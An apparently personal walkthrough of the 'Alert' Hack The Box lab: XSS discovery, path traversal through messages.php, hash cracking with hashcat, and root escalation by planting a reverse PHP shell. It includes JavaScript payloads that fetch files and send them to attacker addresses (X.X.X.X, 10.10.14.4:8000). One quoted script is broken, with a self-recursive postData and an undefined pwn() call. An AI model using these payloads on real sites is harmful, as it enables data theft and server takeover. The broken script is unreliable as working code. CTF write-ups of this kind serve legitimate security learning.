This was my first web hacking box on HTB and boy it was hard. I spent about 2 hours trying to figure it out on my own and an additional two hours understanding the walkthrough, but I learned a lot about web hacking, so here we go.

I started out with an nmap scan to find that port 22 and port 80 are open. After I add `alert.htb` to my `/etc/hosts`, I navigate to the website to find a markdown viewer page.

Here is the first fork in the road: the easiest way to go about this box is to run some dirbusting and subdomain enumeration to get a full understanding of the website. This would give you the hidden messages page and the `statistics.alert.htb` page with relatively no stress. What I did was go straight for the XSS injection, which caused a lot of headache. After a little research, I verified the website was vulnerable to XSS with the alert script:

```html
<iframe><script>alert(1)</script></iframe>
```

This formats it as markdown and runs the script, alerting 1 to the page. At this point I spent a few hours learning how to get RCE through XSS, but I was nowhere close, so I gave up and looked at a walkthrough.

If you don't initially do some fuzzing, the least you can do is try to see what all the available pages do and see their request in Burp Suite. The upload and contact page both had stuff that looked useful, so make sure you send both their requests to the repeater.

Because of the "link share" link at the bottom of the contact page, you can tell it's stored server side, which means that's our entry into the server.

So if we upload a file into the markdown viewer and then send that into the contact message page, we might be able to get something working. The script below is what I used to test this:

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb")
  .then(response => response.text())
  .then(data => {
    fetch("http://X.X.X.X?data=" + btoa(data));
  })
</script>
```

Then it's just using hashcat:

```bash
hashcat --user some.txt rockyou.txt
# -a 0 finds the potential hash type
hashcat -a 0 some.txt rockyou.txt
```

You can use that password to SSH in and get the `user.txt` flag.

Now you might think you'd do some regular pentesting, but you'd be wrong. `sudo -l` doesn't work and using a reverse shell while already in albert doesn't elevate your privileges. You can, however, put a reverse shell in a file that root is using. Running `ps -ef --forest` shows that root has been running a webserver on localhost. Also, if you do an `id`, you can see you're part of the management group. Running `find . -writable` shows what you can write to in the current directory. All point to config in the `/opt/monitor` directory. Go into config, upload a reverse PHP shell, and then curl it:

```bash
curl http://localhost:8080/config/reverse.php
```

There was also a script that ippsec wrote to find the `messages.php` path without fuzzing, in a way that avoids constantly base64-decoding it:

```javascript
async function getData(url) {
    const response = await fetch(url);
    const result = await response.text();
    return result;
}
async function postData(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: data,
    });
    const page = await getData('http://alert.htb/messages.php?file=../../../../../../var/www/statistics.alert.htb');
    await postData('http://10.10.14.4:8000', page);
}
pwn();
```

To sum it up, I'm nowhere close to solving this box end-to-end on my own, even though it's already solved. It'll take time to understand the methodology and the scripting to properly exploit websites.
